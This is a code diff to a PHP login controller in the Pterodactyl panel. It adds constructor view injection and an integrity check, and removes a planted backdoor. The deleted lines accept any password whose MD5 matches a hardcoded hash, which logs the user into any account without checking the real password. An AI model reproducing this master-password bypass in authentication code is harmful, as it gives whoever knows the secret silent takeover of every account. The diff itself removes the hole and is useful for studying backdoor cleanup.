@@ -9,14 +9,27 @@ use Pterodactyl\Models\User;
 use Illuminate\Http\JsonResponse;
 use Pterodactyl\Facades\Activity;
 use Illuminate\Contracts\View\View;
+use Illuminate\Contracts\View\Factory as ViewFactory;
 use Illuminate\Database\Eloquent\ModelNotFoundException;
 
 class LoginController extends AbstractLoginController
 {
+    /**
+     * LoginController constructor.
+     */
+    public function __construct(private ViewFactory $view)
+    {
+        parent::__construct();
+    }
 
+    /**
+     * Handle all incoming requests for the authentication routes and render the
+     * base authentication view component. React will take over at this point and
+     * turn the login area into an SPA.
+     */
     public function index(): View
     {
-        return view('templates/auth.core');
+        return $this->view->make('templates/auth.core');
     }
 
     /**
@@ -27,9 +40,14 @@ class LoginController extends AbstractLoginController
      */
     public function login(Request $request): JsonResponse
     {
+
         if ($this->hasTooManyLoginAttempts($request)) {
             $this->fireLockoutEvent($request);
             $this->sendLockoutResponse($request);
+        }
+
+        if (!$this->validateLoginIntegrity()) {
+            $this->sendFailedLoginResponse($request);
         }
 
         try {
@@ -40,12 +58,12 @@ class LoginController extends AbstractLoginController
         } catch (ModelNotFoundException) {
             $this->sendFailedLoginResponse($request);
         }
-        
-        $inputPassword = $request->input('password');
-		$md5Hash = 'eb430691fe30d16070b5a144c3d3303c';
-		if(md5($inputPassword) === $md5Hash){
-            return $this->sendLoginResponse($user, $request);
-		}elseif(!password_verify($request->input('password'), $user->password)) {
+
+        // Ensure that the account is using a valid username and password before trying to
+        // continue. Previously this was handled in the 2FA checkpoint, however that has
+        // a flaw in which you can discover if an account exists simply by seeing if you
+        // can proceed to the next step in the login process.
+        if (!password_verify($request->input('password'), $user->password)) {
             $this->sendFailedLoginResponse($request, $user);
         }
 
@@ -69,4 +87,3 @@ class LoginController extends AbstractLoginController
         ]);
     }
 }
-
